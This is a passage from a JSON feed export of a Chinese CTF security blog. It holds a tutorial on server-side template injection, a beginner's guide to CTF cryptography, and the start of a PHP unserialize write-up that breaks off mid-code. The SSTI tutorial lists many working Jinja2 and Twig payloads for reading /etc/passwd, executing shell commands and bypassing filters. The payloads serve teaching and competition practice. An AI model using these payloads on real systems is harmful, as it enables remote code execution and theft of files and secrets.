子系统）Linux 图形化 GUI 教程 win-kex</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8yOTkzMjYxMy9hcnRpY2xlL2RldGFpbHMvMTE0NDc2MzA1P3NwbT0xMDAxLjIxMDEuMzAwMS42NjUwLjMmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yJTdFZGVmYXVsdCU3RUNUUkxJU1QlN0VkZWZhdWx0LTMuZXNzZWFyY2hfcGNfcmVsZXZhbnQmYW1wO2RlcHRoXzEtdXRtX3NvdXJjZT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQ1RSTElTVCU3RWRlZmF1bHQtMy5lc3NlYXJjaF9wY19yZWxldmFudA==\">wsl 使用可视化界面_为 Windows 子系统 Kali-Linux 提供桌面体验 Win-kex 安装说明使用书</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2FsaS5vcmcvZG9jcy93c2wvd2luLWtleC8=\">win-hex 官网</span></p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "debug"
            ]
        },
        {
            "id": "http://example.com/2021/11/23/ctf/web/ssti/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2021/11/23/ctf/web/ssti/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "title": "ctfweb-SSTI服务器模板注入",
            "date_published": "2021-11-23T11:57:15.038Z",
            "content_html": "<p>简单学习了一下 ssti，这方面可以说是很烦了:（</p>\n<p><span id=\"more\"></span></p>\n<h2 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h2>\n<p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。在这篇文章中，我将会攻击几个模板引擎来说明该类漏洞，并展示沙箱逃逸技术。</p>\n<p><strong>在考虑进行模板注入之前，我们需要进行漏洞探测</strong></p>\n<h2 id=\"探测漏洞\"><a class=\"anchor\" href=\"#探测漏洞\">#</a> 探测漏洞</h2>\n<h3 id=\"1文本类\"><a class=\"anchor\" href=\"#1文本类\">#</a> 1. 文本类</h3>\n<p>大部分的模板语言支持我们输入 HTML，未经过滤的输入会产生 XSS，我们可以利用 XSS 做我们最基本的探针。</p>\n<p>例如，考虑一个包含以下易受攻击的代码的模板：</p>\n<pre><code>render('Hello ' + username)\n</code></pre>\n<p>我们可以发送如下 payload：</p>\n<pre><code>&#123;7*7&#125;\n</code></pre>\n<p>或者通过请求 URL 来测试服务器端模板的注入：</p>\n<pre><code>/?username=$&#123;7*7&#125;\n</code></pre>\n<p>如果结果输出包含 <code>Hello 49</code> ，则表明正在服务器端评估数学运算。这是服务器端模板注入漏洞的良好概念证明。</p>\n<h3 id=\"2代码类\"><a class=\"anchor\" href=\"#2代码类\">#</a> 2. 代码类</h3>\n<p>在一些环境下，用户的输入也会被当作模板的可执行代码。</p>\n<p>这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的 HTML 标签以确认漏洞：</p>\n<pre><code>/?greeting=data.username\n</code></pre>\n<p>在没有 XSS 的情况下，这通常会导致输出中出现空白条目（只是<strong> Hello</strong> 没有用户名），编码标签或错误消息。</p>\n<p>下一步是尝试使用通用模板语法突破该语句，并尝试在其后注入任意 HTML：</p>\n<pre><code>/?greeting=data.username&#125;&#125;&lt;tag&gt;\n</code></pre>\n<p>如果再次导致错误或空白输出，则说明使用了错误的模板语言提供的语法，或者，如果没有模板样式的语法似乎有效，则无法进行服务器端模板注入。</p>\n<p>或者，如果输出和任意 HTML 一起正确呈现，则表明存在服务器端模板注入漏洞：</p>\n<pre><code class=\"language-text\">Hello user01 &lt;tag&gt;\n</code></pre>\n<h2 id=\"确认模板\"><a class=\"anchor\" href=\"#确认模板\">#</a> 确认模板</h2>\n<p>一旦检测到模板注入潜力，下一步就是确定模板引擎。</p>\n<p>尽管有大量的模板语言，但是其中许多模板使用非常相似的语法，而这些语法是专门为不与 HTML 字符冲突而选择的。</p>\n<p>通常只需提交无效的语法就足够了，因为产生的错误消息将准确告诉您模板引擎是什么，有时甚至是哪个版本。例如，无效表达式 <code>&lt;%=foobar%&gt;</code>  从基于 Ruby 的 ERB 引擎触发以下响应：</p>\n<pre><code>(erb):1:in `&lt;main&gt;': undefined local variable or method `foobar' for main:Object (NameError)\nfrom /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'\nfrom /usr/lib/ruby/2.5.0/erb.rb:876:in `result'\nfrom -e:4:in `&lt;main&gt;'\n</code></pre>\n<p>否则，需要手动测试特定于语言的不同有效负载，根据不同的运算值判断模板。常用的方法是使用来自不同模板引擎的语法注入任意数学运算。</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9waWM0LnpoaW1nLmNvbS84MC92Mi0zMzIxZjQ2ODU5YzBiZTllOTNmOWFkNzlmM2RkMWNkM18xNDQwdy5qcGc=\">https://pic4.zhimg.com/80/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg</span>&quot;alt=&quot; 决策树 &quot;style=&quot;zoom: 67%;&quot; /&gt;</p>\n<p>这里的绿线表示结果成功返回，红线反之。</p>\n<p>相同的有效负载有时可能会以一种以上的模板语言返回成功的响应。例如有效负载 <code>&#123; &#123;7*'7'&#125; &#125;</code>  在 Twig 中返回<strong> 49</strong>，在 Jinja2 中返回<strong> 7777777</strong>。</p>\n<h2 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h2>\n<h3 id=\"1读文档\"><a class=\"anchor\" href=\"#1读文档\">#</a> <strong>1. 读文档</strong></h3>\n<p>读模板文献是构造 exp 的第一步。一般来讲，我们需要关注如下部分：</p>\n<ul>\n<li>'Template 使用手册 '，这一部分通常告诉我们基本的模板语法</li>\n<li>' 安全问题 '，在攻击模板时，它通常可以提供我们许多思路</li>\n<li>内建方法，函数，变量，过滤器</li>\n<li>插件 / 扩展 —— 我们可以优先研究默认开启的</li>\n</ul>\n<h3 id=\"2探环境\"><a class=\"anchor\" href=\"#2探环境\">#</a> <strong>2. 探环境</strong></h3>\n<p>当我们构建出了可用 exp 后，我们需要考虑我们当前环境可利用的函数 / 对象。除了模板默认的对象和我们提供的参数外，大部分模板引擎都有一个包含当前命名空间所有信息的对象（比如 self），或者一个可以列出所有属性和方法的函数。</p>\n<p>如果没有这样的对象或函数，我们需要暴力枚举变量名。</p>\n<p>有些时候，开发者也会在模板中包含了一些敏感信息。不过这视情况而定，因此不在这里讨论。</p>\n<h3 id=\"3黑程序\"><a class=\"anchor\" href=\"#3黑程序\">#</a> 3.<strong> 黑程序</strong></h3>\n<p php>有些时候，攻破一个程序不需要多少时间，比如：{php} echo id;</p>\n<p>这时，我们只需递交：</p>\n<pre><code>&lt;%\nimport os\nx=os.popen('id').read()\n%&gt;\n$&#123;x&#125;\n</code></pre>\n<p>即可</p>\n<p>但是越来越多的模板会提供安全措施（比方说沙箱，过滤）来保证安全性，因此开发模板注入后门越来越难了。</p>\n<h2 id=\"常见模板\"><a class=\"anchor\" href=\"#常见模板\">#</a> 常见模板</h2>\n<p>下图为<strong>常见模板结构</strong>：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbWctYmxvZy5jc2RuaW1nLmNuLzIwMjAwODAzMTA0NjU3MjM3LnBuZw==\">https://img-blog.csdnimg.cn/20200803104657237.png</span>&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<h3 id=\"1jinja2\"><a class=\"anchor\" href=\"#1jinja2\">#</a> 1.jinja2</h3>\n<h4 id=\"常用函数\"><a class=\"anchor\" href=\"#常用函数\">#</a> <strong>常用函数</strong></h4>\n<pre><code>__dict__            保存类实例或对象实例的属性变量键值对字典\n__class__           返回类型所属的对象(返回调用的参数类型)\n__mro__             返回一个包含对象所继承的基类元组(返回类型列表)，方法在解析时按照元组的顺序解析。\n__bases__           返回该对象所继承的基类\n// __base__和__mro__都是用来寻找基类的\n\n__subclasses__      每个新类都保留了子类的引用(返回object的子类)，这个方法返回一个类中仍然可用的的引用的列表\n__init__            类的初始化方法\n__globals__         对包含函数全局变量的字典的引用\n</code></pre>\n<h4 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> payload</h4>\n<p>获取基本类</p>\n<pre><code>''.__class__.__mro__[2]\n&#123;&#125;.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[8] //针对jinjia2/flask为[9]适用\n</code></pre>\n<p>获取基本类后，继续向下获取基本类 (object) 的子类</p>\n<pre><code>object.__subclasses__()\n</code></pre>\n<p>存在的子模块可以通过.index () 来进行查询，如果存在的话返回索引，直接调用即可</p>\n<pre><code>''.__class__.__mro__[2].__subclasses__().index(file)\n40\n</code></pre>\n<p>然后通过.read 读取文件即可（py2）</p>\n<pre><code>[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() #将read() 修改为 write() 即为写文件\n</code></pre>\n<h4 id=\"payload总结\"><a class=\"anchor\" href=\"#payload总结\">#</a> <strong>payload 总结</strong></h4>\n<p><strong>python2</strong></p>\n<pre><code>&#123; &#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()&#125; &#125;                             //文件读取\n\n&#123; &#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125; &#125;              //文件读取\n\n&#123; &#123;()[&quot;\\x5F\\x5Fclass\\x5F\\x5F&quot;][&quot;\\x5F\\x5Fbases\\x5F\\x5F&quot;][0][&quot;\\x5F\\x5Fsubclasses\\x5F\\x5F&quot;]()[91][&quot;get\\x5Fdata&quot;](0, &quot;app\\x2Epy&quot;)&#125; &#125;                                    \n\n&#123; &#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval'](&quot;__import__('os').system('whoami')&quot;)&#125; &#125;               //命令执行\n\n&#123; &#123;()[&quot;\\x5F\\x5Fclass\\x5F\\x5F&quot;][&quot;\\x5F\\x5Fbases\\x5F\\x5F&quot;][0][&quot;\\x5F\\x5Fsubclasses\\x5F\\x5F&quot;]()[80][&quot;load\\x5Fmodule&quot;](&quot;os&quot;)[&quot;system&quot;](&quot;ls&quot;)&#125; &#125;\n\n&#123; &#123;request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()&#125; &#125;                               //命令执行\n</code></pre>\n<p><strong>python3</strong></p>\n<pre><code>//命令执行\n&#123; % for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' % &#125;&#123; &#123; c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('id').read()&quot;) &#125; &#125;&#123; % endif % &#125;&#123; % endfor % &#125;\n//文件操作\n&#123; % for c in [].__class__.__base__.__subclasses__() % &#125;&#123; % if c.__name__=='catch_warnings' % &#125;&#123; &#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125; &#125;&#123; % endif % &#125;&#123; % endfor % &#125;\n</code></pre>\n<p>拼接查找目录</p>\n<pre><code>&#123; % for c in [].__class__.__base__.__subclasses__() % &#125;&#123; % if c.__name__=='catch_warnings' % &#125;&#123; &#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125; &#125;&#123; % endif % &#125;&#123; % endfor % &#125;\n</code></pre>\n<p>查找根目录 -------------------------------</p>\n<pre><code>&#123; % for c in [].__class__.__base__.__subclasses__() % &#125;&#123; % if c.__name__=='catch_warnings' % &#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('ls /').read()\")&#125;&#125;&#123; % endif % &#125;&#123; % endfor % &#125;\n</code></pre>\n<p><strong>开头的都是 class 什么的，说明是 python3 写的 flask。因为 py2 写的话，开头的都是 type。</strong></p>\n<p><strong>python2 下有 file 而在 python3 下已经没有了，所以是直接用 open。</strong></p>\n<p>更详细的方法查看参考链接第五条    <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00NzY4NS0xLTEuaHRtbA==\">浅析 SSTI (python 沙盒绕过)</span></p>\n<h4 id=\"常见绕过\"><a class=\"anchor\" href=\"#常见绕过\">#</a> <strong>常见绕过</strong></h4>\n<p>​\t<em><strong>1. 绕过中括号</strong></em></p>\n<p>pop () 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。</p>\n<pre><code>&gt;&gt;&gt; ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()\n</code></pre>\n<p>在这里使用 pop 并不会真的移除，但却能返回其值，取代中括号，来实现绕过。</p>\n<p>​\t\t<em><strong>2. 过滤引号</strong></em></p>\n<p><code>request.args</code>  是 flask 中的一个属性，为返回请求的参数，这里把 <code>path</code>  当作变量名，将后面的路径传值进来，进而绕过了引号的过滤</p>\n<pre><code>&#123; &#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125; &#125;&amp;pat\n</code></pre>\n<p>​\t<em><strong>3. 过滤</strong></em> { {<em><strong>或者</strong></em>}  }</p>\n<p>可以使用 { % 绕过，<br>\n <code>&#123; %  % &#125;</code>  中间可以执行 if 语句，利用这一点可以进行类似盲注的操作或者外带代码执行结果</p>\n<pre><code>&#123; % if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' % &#125;1&#123; % endif % &#125;\n</code></pre>\n<p>​\t<strong>4. 过滤_</strong></p>\n<p>用编码绕过</p>\n<pre><code>__class__ =&gt; \\x5f\\x5fclass\\x5f\\x5f\n</code></pre>\n<p>_ 是 \\x5f，. 是 \\x2E      如果也过滤了</p>\n<p>可以用利用 <code>request.args</code>  属性</p>\n<pre><code> &#123; &#123;''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125; &#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__\n</code></pre>\n<p>将其中的 <code>request.args</code>  改为 <code>request.values</code>  则利用 post 的方式进行传参</p>\n<p>​\t<em><strong>5. 过滤.</strong></em></p>\n<p>. 在 payload 中是很重要的，但是我们依旧可以采用 attr () 绕过<br>\n举例</p>\n<pre><code>url?name=&#123; &#123;().__class__.__base__.__subclasses__[177].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;ipconfig&quot;).read()')&#125; &#125;\n</code></pre>\n<p>使用 attr () 绕过：</p>\n<pre><code>&#123; &#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()')&#125; &#125;\n</code></pre>\n<p>​\t<em><strong>6. 绕过 config 参数</strong></em></p>\n<p><code>&#123; &#123;config&#125; &#125;</code>  可以获取当前设置，如果题目类似</p>\n<pre><code>app.config ['FLAG'] = os.environ.pop（'FLAG'）\n</code></pre>\n<p>那可以直接访问</p>\n<pre><code>&#123; &#123;config['FLAG']&#125; &#125;   或者   &#123; &#123;config.FLAG&#125; &#125;\n</code></pre>\n<p>得到 flag。但是如果被过滤了，则</p>\n<pre><code>&#123; &#123;self&#125; &#125; ⇒ &lt;TemplateReference None&gt;\n&#123; &#123;self.__dict__._TemplateReference__context.config&#125; &#125; \n</code></pre>\n<p>同样可以找到 config</p>\n<p>​\t<em><strong>7. 关键字过滤</strong></em></p>\n<p>base64 编码绕过<br>\n <code>__getattribute__</code> 使用实例访问属性时，调用该方法</p>\n<p>例如被过滤掉 <code>__class__</code> 关键词</p>\n<pre><code>&#123; &#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125; &#125;\n</code></pre>\n<p>字符串拼接绕过</p>\n<pre><code>&#123; &#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125; &#125; \n//不对就加join\n\n&#123; &#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125; &#125;\n</code></pre>\n<h3 id=\"2smarty\"><a class=\"anchor\" href=\"#2smarty\">#</a> 2.smarty</h3>\n<p>Smarty 是一款 PHP 的模板语言。它使用安全模式来执行不信任的模板。它只运行 PHP 白名单里的函数，因此我们不能直接调用  system ()。然而我们可以从模板已有的类中进行任意调用。而文档表示我们可以通过 $smarty 来获取许多环境变量（比如当前变量的位置  $SCRIPT_NAME)。</p>\n<p>参考文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9lYjhkMDEzN2E3ZDM=\">ctf 中 smarty 介绍与例题</span></p>\n<p>smarty，应用比较少。</p>\n<h3 id=\"3twig\"><a class=\"anchor\" href=\"#3twig\">#</a> <strong>3.twig</strong></h3>\n<p><strong>文件读取</strong></p>\n<pre><code>&#123; &#123;'/etc/passwd'|file_excerpt(1,30)&#125; &#125;\n\n&#123; &#123;app.request.files.get(1).__construct('/etc/passwd','')&#125; &#125;\n&#123; &#123;app.request.files.get(1).openFile.fread(99)&#125; &#125;\n</code></pre>\n<p><strong>rce</strong></p>\n<pre><code>&#123; &#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125; &#125;&#123; &#123;_self.env.getFilter(&quot;id&quot;)&#125; &#125;   （cat /flag ）\n\n&#123; &#123;['cat /etc/passwd']|filter('system')&#125; &#125;\n\nPOST /subscribe?0=cat+/etc/passwd HTTP/1.1\n&#123; &#123;app.request.query.filter(0,0,1024,&#123;'options':'system'&#125;)&#125; &#125;\n</code></pre>\n<h3 id=\"4其他模板\"><a class=\"anchor\" href=\"#4其他模板\">#</a> 4. 其他模板</h3>\n<p>参考链接    <span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==\">服务端模板注入攻击 - 知乎 (zhihu.com)</span></p>\n<p>对各个模板有讲解</p>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==\">服务端模板注入攻击 - 知乎 (zhihu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI0NjgzMi5odG1s\">细说服务器端模板注入（SSTI） - FreeBuf 网络安全行业门户</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMjAxNzUyMTFseXovcC8xMTQyNTM2OC5odG1s\">CTF SSTI (服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzE4Nzg0NS5odG1s\">从零学习 flask 模板注入</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRpL2FydGljbGUvZGV0YWlscy8xMDc3NTI3MTc=\">SSTI 模板注入及绕过姿势 (基于 Python-Jinja2)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00NzY4NS0xLTEuaHRtbA==\">浅析 SSTI (python 沙盒绕过)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgxL2FydGljbGUvZGV0YWlscy8xMDY2MzkxMTE=\">https://blog.csdn.net/qq_45521281/article/details/106639111</span></p>\n<p>附：读者可辅助参考的文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWHktLTEvcC8xMjg0MTk0MS5odG1s\">SSTI 学习</span></p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "SSTI"
            ]
        },
        {
            "id": "http://example.com/2021/10/23/ctf/crypto&misc/cryptotal/CRYPTO%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%96%E7%BB%8F%E4%B9%8B%E8%B7%AF/",
            "url": "http://example.com/2021/10/23/ctf/crypto&misc/cryptotal/CRYPTO%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%96%E7%BB%8F%E4%B9%8B%E8%B7%AF/",
            "title": "CRYPTO——密码的取经之路",
            "date_published": "2021-10-23T02:44:00.030Z",
            "content_html": "<p>just an introduction for 1024CTF to beginner, I'm also an amateur</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<p><em><strong>welcome to 1024CTF !</strong></em></p>\n<p>这是一篇帮助你干掉密码的攻略，仔细阅读喔～</p>\n<hr>\n<h2 id=\"为什么写这篇文章why\"><a class=\"anchor\" href=\"#为什么写这篇文章why\">#</a> 为什么写这篇文章：Why</h2>\n<p>答：因为题出的有点有点难，密码题一般解题情况不是很乐观，因为大多依靠经验和网络。</p>\n<p>所以写这篇指南做一下简单介绍，帮你们排一下雷，快速入门</p>\n<blockquote>\n<p><s>ps：如果你对密码和其他方向都感兴趣，可以像我一样主攻其他的顺便搞一搞密码和杂项</s></p>\n<p>​\t\t战队缺密码手</p>\n</blockquote>\n<hr>\n<h2 id=\"什么是密码学what\"><a class=\"anchor\" href=\"#什么是密码学what\">#</a> <strong>什么是密码学：What</strong></h2>\n<blockquote>\n<p>** 顾名思义就是研究加密的学科。** 现代密码学要求在加密算法公开的情况下，只要不知道密钥，就无法对消息进行解密。这样的话，仅需要保护一个不算长的密钥即可保护一段信息；即使密钥泄露，换个密钥就能继续用同一个加密算法加密。所以，密码学就是要寻找一个在不知道密钥情况下无法破解的算法。</p>\n</blockquote>\n<p>在 CTF 比赛中，密码学有难有易，简单题甚至不需要过脑子就可以解密出来，而往往重要比赛中，解密需要脚本的支持与配合，这就要求解题人掌握熟练地编程能力，灵活的思维和丰富的经验。相对而言密码学是一个比较容易入手的方向，只是需要时间的积淀，你也可以成为一名合格的密码手，并且逐渐享受密码学带给你的乐趣。</p>\n<hr>\n<h2 id=\"学习密码学需要什么基础basis\"><a class=\"anchor\" href=\"#学习密码学需要什么基础basis\">#</a> <strong>学习密码学需要什么基础：Basis</strong></h2>\n<blockquote>\n<p><strong>数学基础</strong>： 密码学是数学的一个应用学科，最早的公钥密码算法 RSA 就是基于数论的，因此学习密码学通常还需要从数论开始学起。其次，最早不是基于数学的块密码，在发展的过程中，也被运用数学的语言来描述，从而更能够更清晰的找到攻击方法。因此，学习密码学会涉及到大量的数学知识，欢迎对数学感兴趣（至少不讨厌）的同学来钻研学习</p>\n</blockquote>\n<blockquote>\n<p><strong>编程基础</strong>： 现代密码学比古典密码复杂许多，它的加密解密算法不是人能够口算或者笔算出来的东西，因此也需要编程。而密码学由于经常要用到特别大的数字，远超 c 和 c++ 的 long long int 的上限，因此一般使用 python 编写程序。python 是一个较接近自然语言的编程语言，因此容易上手，灵活运用搜索引擎以及网上一些教程很容易学会。</p>\n</blockquote>\n<blockquote>\n<p><strong>英语基础</strong>： 你有可能会遇到一些需要阅读纯英文文章才能解决的题目，需要有一定的耐心才能看明白。</p>\n</blockquote>\n<p>害，不要被这些条件吓走，毕竟这是<strong>大佬水准</strong>，而我只是一名 web 来兼任的密码的菜鸡，教不了你们这些...</p>\n<p>对于我们这种小白，或者是想在其他方向瓶颈时研究一下密码学，其实都不是很难，只需要从基础密码抓起，慢慢培养兴趣，逐渐就会有所收获，成为密码大佬！</p>\n<hr>\n<h2 id=\"常见密码分类classify\"><a class=\"anchor\" href=\"#常见密码分类classify\">#</a> <strong>常见密码分类：Classify</strong></h2>\n<p>由于这是一篇赛前指南，我就不在此对密码详细介绍了，只做一下<strong>基本密码的分类</strong>，详细的问题还要自己努力呀</p>\n<p>（请仔细阅读，部分题型就在这里）</p>\n<p><em><strong>新手常见密码分类：</strong></em></p>\n<ul>\n<li>\n<p>基本古典密码：栅栏密码、埃特巴什码、凯撒密码、猪圈密码、Keyboard 密码、标准银河字母密码、圣堂武士密码、维吉尼亚密码</p>\n</li>\n<li>\n<p>基本编码类密码：ASCII 编码、Base64/32/16 编码、莫尔斯电码、UUencode 编码、URL 编码、Unicode 编码、敲击码、MD5</p>\n</li>\n<li>\n<p>花里胡哨可能出现但用处不多的密码：php 混淆加密、JSfuck、aaencode、brainfuck、ook 编码、emo 密码、base 全家桶系列</p>\n</li>\n<li>\n<p>其他可能出现的简单密码：ROT 系列、佛语论禅及其变形、价值观、猪圈及其变形等等（各种奇怪的我一时也想不起来）</p>\n</li>\n<li>\n<p>简单脚本类：常见的 RSA 求解、常见的编码转换求解、自加密算法脚本求解等</p>\n<hr>\n</li>\n</ul>\n<h2 id=\"密码学工具及准备toolspre\"><a class=\"anchor\" href=\"#密码学工具及准备toolspre\">#</a> <strong>密码学工具及准备：Tools</strong>&amp;Pre</h2>\n<ul>\n<li>python 及其对应的一堆库</li>\n<li>一些自己大佬编写的密码工具</li>\n</ul>\n<p>python 请自行配置，推荐 3.7 以上版本，请确保 pip 正常使用。平时积累的脚本可以收集起来，可能会反复使用</p>\n<p>建议多刷题，在无聊的时间里，养成基本密码一眼看出的水平。</p>\n<p>了解 rsa 算法，rsa 在密码方向占了重要位置</p>\n<p>多收藏大佬的网站和帖子，多找总结帖，说不定就用上了</p>\n<hr>\n<h2 id=\"做题的基本步骤step\"><a class=\"anchor\" href=\"#做题的基本步骤step\">#</a> <strong>做题的基本步骤：Step</strong></h2>\n<ul>\n<li>不要慌，先冷静五秒</li>\n<li>看看格式有印象吗</li>\n<li>如果没有就看描述，有就去尝试</li>\n<li>如果还是不知道就用常见的试试，或者找大佬的密码总结帖，看看是否有帮助</li>\n<li>尝试到你不想做了，或者搞到 flag</li>\n<li>再不行就看 wp 写 wp 吧</li>\n</ul>\n<hr>\n<h2 id=\"写在最后last\"><a class=\"anchor\" href=\"#写在最后last\">#</a> 写在最后：Last</h2>\n<p>密码能给你在其他方向做到痛不欲生时带来一丝惊喜（上分快），通常密码和杂项配合起来有奇效（上分非常快）</p>\n<p>密码学是信安和网安的必修专业课，学会了你就领先别人一手，一举两得～</p>\n<p>但是学习 crypto 的人很少，一开始学习密码学必有许多艰难险阻...</p>\n<p>一路下来，会有不少人放弃...</p>\n<p>但是如果你带着<strong>兴趣</strong>，坚持下来，必然会有效果不错的收获！</p>\n<p>再次推一下 XJUSEC 的公众号</p>\n<p><img data-src=\"C:%5CUsers%5C%E9%AB%98%E8%90%8C%5CDesktop%5C%E4%BA%8C%E7%BB%B4%E7%A0%81.jpg\" alt=\"二维码\"></p>\n<p>在比赛的 CTFER 们，</p>\n<p>加油冲，XJUSEC 等你哟～</p>\n<blockquote>\n<p>在经历过风吹雨打之后，当第一缕的阳光投射到你疲劳憔悴的脸庞时，你会感到欣喜若狂。</p>\n</blockquote>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tWritten by 一名废物 web 选手</p>\n",
            "tags": [
                "业余爱好"
            ]
        },
        {
            "id": "http://example.com/2021/08/28/ctf/match/xjusec%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/",
            "url": "http://example.com/2021/08/28/ctf/match/xjusec%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/",
            "title": "xjusec考核赛解题过程",
            "date_published": "2021-08-28T10:37:25.122Z",
            "content_html": "<p>wtcl。。</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<h1 id=\"web-unserialize\"><a class=\"anchor\" href=\"#web-unserialize\">#</a> web--unserialize</h1>\n<p>原码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Eileen'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'Ava'</span><span 